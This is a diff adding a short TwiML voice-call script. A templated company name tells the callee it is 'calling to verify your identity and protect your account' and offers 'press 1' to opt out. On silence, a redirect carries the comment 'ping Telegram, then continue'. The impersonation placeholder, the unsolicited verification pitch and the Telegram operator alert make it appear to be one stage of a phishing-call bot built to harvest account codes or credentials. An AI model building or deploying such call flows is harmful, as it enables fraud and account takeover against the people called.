@@ -1,0 +1,19 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<Response>
+
+  <!-- Opt-out gate. -->
+  <Gather numDigits="1" action="/webhooks/voice/verify/not_you" timeout="6">
+    <Say voice="{{voice}}">
+      {{record_notice}}
+      This is {{company}}.
+      We are calling to verify your identity and protect your account.
+      If this was not you, or if you did not request this call,
+      press 1 now to be removed from our list.
+      Otherwise, please stay on the line.
+    </Say>
+  </Gather>
+
+  <!-- Silent -> ping Telegram, then continue. -->
+  <Redirect method="POST">/webhooks/voice/verify/not_you_silent</Redirect>
+
+</Response>
